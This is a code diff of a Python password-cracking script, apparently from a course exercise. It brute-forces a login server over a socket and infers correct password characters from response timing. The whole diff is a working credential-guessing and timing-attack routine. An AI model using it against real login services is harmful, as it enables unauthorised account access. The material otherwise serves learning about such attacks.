@@ -3,6 +3,8 @@ import socket
 import string
 import itertools
 import json
+from datetime import datetime
+
 
 alphabet_lower = string.ascii_lowercase
 alphabet_upper = string.ascii_uppercase
@@ -37,17 +39,21 @@ def try_with_login_empty_pass(login, sock):
 def try_different_passwords(login, sock):
     password_letter_generator = get_password_letters()
     password = next(password_letter_generator)
+    threshold = 0.1
     while True:
         pass_login = {"login": f"{login}", "password": f"{password}"}
         sock.send(json.dumps(pass_login).encode())
+        start_time = datetime.now()
         resp = json.loads(sock.recv(buffer).decode())
-        if resp["result"] == "Exception happened during login":
-            password_letter_generator = get_password_letters()
-            password = f"{password}{next(password_letter_generator)}"
-        elif resp["result"] == "Wrong password!":
-            next_letter = next(password_letter_generator)
-            password = password[:-1]
-            password = f"{password}{next_letter}"
+        result_time = datetime.now() - start_time
+        if resp["result"] == "Wrong password!":
+            if result_time.total_seconds() > threshold:
+                password_letter_generator = get_password_letters()
+                password = f"{password}{next(password_letter_generator)}"
+            else:
+                next_letter = next(password_letter_generator)
+                password = password[:-1]
+                password = f"{password}{next_letter}"
         else:
             print(json.dumps(pass_login))
             break
@@ -76,7 +82,7 @@ def generate_password():
                 yield p
 
 
-def connect_stage4():
+def connect_stage4_5():
     args = sys.argv
     ip_addr = args[1]
     port = int(args[2])
@@ -111,4 +117,4 @@ def connect_stage3():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    connect_stage4()
+    connect_stage4_5()
